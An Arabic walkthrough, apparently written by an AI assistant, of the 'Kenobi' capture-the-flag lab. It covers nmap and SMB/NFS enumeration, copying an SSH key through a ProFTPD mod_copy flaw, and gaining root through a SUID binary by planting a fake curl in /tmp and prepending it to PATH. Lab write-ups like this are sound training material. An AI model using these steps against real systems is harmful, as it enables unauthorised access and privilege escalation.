

---

# 1) الهدف من الروم

الروم مصممة لتتعلم 3 أفكار رئيسية:

1. **Enumerating SMB** (اكتشاف المشاركات عبر SMB)
2. **استغلال NFS** للوصول لملفات النظام
3. **Privilege Escalation** باستخدام
   **SUID + PATH Manipulation**

وفي النهاية تحصل على:

* **User flag**
* **Root flag**

---

# 2) أول خطوة – Enumeration (استكشاف السيرفر)

نبدأ دائمًا بعمل **port scan** لمعرفة الخدمات.

## الأمر

```bash
nmap -sV -p- 10.10.10.10
```

### شرح السطر

**nmap**
(أداة لفحص الشبكات واكتشاف الخدمات)

**-sV**
(Service Version Detection)
→ معرفة **نوع الخدمة وإصدارها**

**-p-**
→ فحص **كل البورتات من 1 إلى 65535**

**10.10.10.10**
→ IP الهدف

---

## البورتات التي ظهرت في الروم

| Port | Service |
| ---- | ------- |
| 21   | FTP     |
| 22   | SSH     |
| 111  | RPCBind |
| 139  | SMB     |
| 445  | SMB     |

---

# 3) شرح البورتات المهمة

## Port 445 / 139

خدمة:

**SMB**

(SMB = Server Message Block)

بروتوكول يستخدمه Windows وLinux لمشاركة:

* الملفات
* الطابعات
* الموارد

---

## Port 21

خدمة:

**FTP**

(File Transfer Protocol)

بروتوكول لنقل الملفات بين:

* Client
* Server

---

## Port 111

خدمة:

**RPCBind**

(Remote Procedure Call Binder)

وظيفته:

يربط **طلبات الشبكة** بالخدمات مثل:

```
NFS
```

---

# 4) Enumerating SMB Shares

نستخدم nmap script لمعرفة الـ shares.

## الأمر

```bash
nmap -p445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10
```

### شرح السطر

**-p445**

فحص بورت SMB

---

**--script**

تشغيل scripts داخل nmap

---

**smb-enum-shares**

يبحث عن:

```
shared folders
```

---

**smb-enum-users**

يبحث عن:

```
users
```

---

# 5) الدخول على SMB Share

وجدنا share اسمه:

```
anonymous
```

## الأمر

```bash
smbclient //10.10.10.10/anonymous
```

### شرح السطر

**smbclient**

برنامج للدخول على SMB shares

---

**//IP/share**

صيغة الاتصال بالـ share

---

عند طلب:

```
password
```

اضغط Enter لأن:

```
anonymous login
```

---

# 6) عرض الملفات داخل الشير

داخل smbclient:

```bash
ls
```

ظهر ملف:

```
log.txt
```

---

# 7) تحميل الملف

يمكن تحميل الشير بالكامل:

```bash
smbget -R smb://10.10.10.10/anonymous
```

### شرح السطر

**smbget**

تحميل ملفات من SMB

---

**-R**

Recursive
(تحميل كل الملفات داخل المجلد)

---

# 8) قراءة الملف

```bash
cat log.txt
```

وجدنا معلومات مهمة:

* user اسمه **kenobi**
* معلومات عن **FTP server**
* بورت FTP

الإجابة على السؤال:

```
FTP running on port 21
```

---

# 9) Enumeration لـ NFS

بما أن بورت **111** مفتوح، نفحص NFS.

## الأمر

```bash
nmap -p111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.10.10
```

### شرح السكربتات

**nfs-ls**

يعرض الملفات في NFS share

---

**nfs-statfs**

يعرض معلومات عن filesystem

---

**nfs-showmount**

يعرض:

```
mountable directories
```

---

ظهر mount:

```
/var
```

---

# 10) استغلال NFS

## إنشاء مجلد للـ mount

```bash
mkdir /mnt/kenobi
```

### شرح

**mkdir**

(Create Directory)

إنشاء مجلد جديد.

---

## ربط الـ NFS share

```bash
mount 10.10.10.10:/var /mnt/kenobi
```

### شرح السطر

**mount**

ربط filesystem خارجي بالنظام.

---

**10.10.10.10:/var**

المجلد المشترك من السيرفر.

---

**/mnt/kenobi**

المكان الذي سنراه فيه.

---

## عرض الملفات

```bash
ls -la /mnt/kenobi
```

وجدنا:

```
/var/tmp
```

---

# 11) استغلال FTP

باستخدام exploit:

**ProFTPD mod_copy**

الثغرة تسمح:

```
copy file without authentication
```

---

نستخدمها لنسخ:

```
SSH private key
```

(SSH Private Key = مفتاح خاص للدخول عبر SSH)

---

# 12) الدخول عبر SSH

بعد الحصول على المفتاح:

```bash
ssh -i id_rsa kenobi@target
```

### شرح

**-i**

تحديد private key

---

الآن دخلنا كـ:

```
kenobi
```

---

# 13) الحصول على User Flag

```bash
cat /home/kenobi/user.txt
```

---

# 14) Privilege Escalation

نبحث عن ملفات SUID.

## الأمر

```bash
find / -perm -u=s -type f 2>/dev/null
```

### شرح السطر

**find /**

البحث في كل النظام.

---

**-perm -u=s**

البحث عن ملفات **SUID**

(SUID = ملف يعمل بصلاحيات المالك)

---

**-type f**

فقط الملفات.

---

**2>/dev/null**

إخفاء الأخطاء.

---

وجدنا ملف غريب:

```
/usr/bin/menu
```

---

# 15) تحليل البرنامج

نستخدم:

```bash
strings /usr/bin/menu
```

### strings

يعرض النصوص داخل **binary files**.

وجدنا أنه يشغل:

```
curl
uname
ifconfig
```

بدون المسار الكامل.

---

# 16) استغلال PATH Manipulation

**PATH**

(متغير يخبر النظام أين يبحث عن البرامج)

---

## الخطوات

### الذهاب إلى tmp

```bash
cd /tmp
```

---

### إنشاء curl مزيف

```bash
cp /bin/sh curl
```

---

### إعطاء صلاحيات التنفيذ

```bash
chmod +x curl
```

---

### تعديل PATH

```bash
export PATH=/tmp:$PATH
```

---

### تشغيل البرنامج

```bash
/usr/bin/menu
```

اختر:

```
1
```

---

## ماذا يحدث؟

البرنامج يشغل:

```
curl
```

لكن النظام سيشغل:

```
/tmp/curl
```

وهو في الحقيقة:

```
/bin/sh
```

لكن بصلاحيات:

```
root
```

---

# 17) التأكد

```bash
whoami
```

النتيجة:

```
root
```

---

# 18) الحصول على Root Flag

```bash
cat /root/root.txt
```

---

# ملخص الهجوم

1️⃣ Scan بالبـ **Nmap**
2️⃣ اكتشاف **SMB share**
3️⃣ تحميل **log file**
4️⃣ اكتشاف **FTP + NFS**
5️⃣ mount **NFS share**
6️⃣ استغلال **ProFTPD**
7️⃣ الدخول عبر **SSH**
8️⃣ العثور على **SUID binary**
9️⃣ استغلال **PATH Manipulation**
🔟 الحصول على **root**

---

✅ لو حابب، أعمل لك أيضًا:

* **خريطة ذهنية للروم (Kenobi Attack Path)**
* أو **Checklist ثابتة تمشي بها في أي CTF** بنفس الطريقة التي استخدمناها هنا.
